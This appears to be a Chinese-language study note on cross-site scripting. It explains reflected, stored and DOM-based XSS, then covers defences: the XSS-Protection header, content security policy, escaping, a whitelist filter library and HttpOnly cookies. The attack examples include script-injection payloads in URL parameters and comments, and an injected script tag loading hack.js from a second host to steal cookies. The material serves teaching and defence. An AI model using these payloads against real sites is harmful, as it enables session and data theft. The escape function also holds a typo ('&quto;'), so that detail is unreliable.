## XSS攻击和防御手段

##### XSS攻击：跨站脚本攻击

> 跨站脚本攻击XSS（Cross Site Scripting),是最普遍的安全漏洞，通过向有安全漏洞的web网站运行非法的非本站的HTML标签和JavaScript脚本进行的一种攻击

##### XSS攻击方式分类

- 反射型：URL参数直接注入

   A.攻击者通过诱导用户点击恶意 URL， URL可能是这样：

   `http://localhost:3000/?from=<script>alert('我是一段恶意攻击脚本！')</script>`

   B.服务器接收到参数，将恶意代码取出拼接在用户 HTML 中，用户浏览器接收后进行执行，其中恶意代码 也被执行了。

  ```js
  // 普通 
  http://localhost:3000/?from=china 
  // alert尝试 
  http://localhost:3000/?from=<script>alert(3)</script> 
  // 获取Cookie 
  http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>
  // 短域名伪造  https://dwz.cn/
  // 伪造cookie入侵 chrome document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNT Y1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
  ```

- 存储型：存储到DB中，运行时执行存储的脚本达到注入目的

  假设场景：攻击者在评论中写入一段恶意脚本，其他用户访问评论类别时，恶意脚本便会获取到用户的信息

  ```js
  // 评论 
  <script>alert(1)</script>
  // 跨站脚本注入 
  我来了<script src="http://localhost:4000/hack.js"></script>
  ```

- Dom型：URL参数注入

  Dom型攻击和反射型类型类似，通过URL写入恶意脚本，区别是浏览器接受参数并且直接解析

#####  XSS攻击危害

- 获取页面数据
- 获取用户Cookies
- 劫持前端逻辑
- 偷取网站的任意数据
- 偷取用户的资料
- 偷取用户的秘密和登录态
- 欺骗用户

##### XSS防御手段

1. X-XSS-Protection

   > HTTP X-XSS-Protection 响应头是 Internet Explorer，Chrome 和 Safari 的一个特性，当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面。
   > 配置参数：
   > 0 - 禁止 XSS 过滤。
   > 1 - 启用 XSS 过滤（通常浏览器是默认的）。浏览器检测到攻击后将去除不安全部分
   > 1;mode=block - 启用 XSS 过滤，检测到攻击之后，不会清除不安全部分，而是阻止页面加载
   > 1;report= (Chromium only) - 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri指令的功能发送违规报告。

2. CSP内容安全策略

   > **内容安全策略**（CSP content security Policy）是一个附加的安全层，用户帮助检测和缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入的攻击。CSP本质上就是建立白领单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是浏览器自己实现的，通过这种方式可以减少XSS攻击。

   ```js
   // 只允许加载本站资源 
   Content-Security-Policy: default-src 'self' 
   // 只允许加载 HTTPS 协议图片 
   Content-Security-Policy: img-src https://* 
   // 不允许加载任何来源框架 
   Content-Security-Policy: child-src 'none'
   ```

   ```js
   ctx.set('Content-Security-Policy',"default-src 'self'")
   // 尝试一下外部资源不能加载 
   http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>
   ```

   

3. 转义字符

   **黑名单**

   > 用户输入的永远不可信任，最普遍的做法就是转义输入输出内容，对于引号，尖括号，斜杠进行转义

   ```js
   function escape(str) { 
     str = str.replace(/&/g, '&amp;') 
     str = str.replace(/</g, '&lt;') 
     str = str.replace(/>/g, '&gt;') 
     str = str.replace(/"/g, '&quto;') 
     str = str.replace(/'/g, '&#39;') 
     str = str.replace(/`/g, '&#96;') 
     str = str.replace(/\//g, '&#x2F;') 
     return str 
   }
   ```

   > 对于富文本来说，显然不能通过上述的方法转义所有的字符，因为这样会把已有的格式给转义掉。这种情况需要通过白名单的方式过滤，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。

   ****

   **白名单**

   ```js
   const xss = require('xss') 
   let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>') 
   // --> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt; console.log(html)
   ```

4. httpOnly Cookie

   > 这是预防XSS攻击截取用户cookie最有效的防御手段。web应用程序在设置Cookie时，将其属性设置为HttpOnly,就可以避免网页的Cookie被客户端恶意的javascript窃取，从而保护用户cookie信息

   ```js
   response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
   ```

##### 相关资料

# [前端安全系列（一）：如何防止XSS攻击？](https://tech.meituan.com/2018/09/27/fe-security.html)

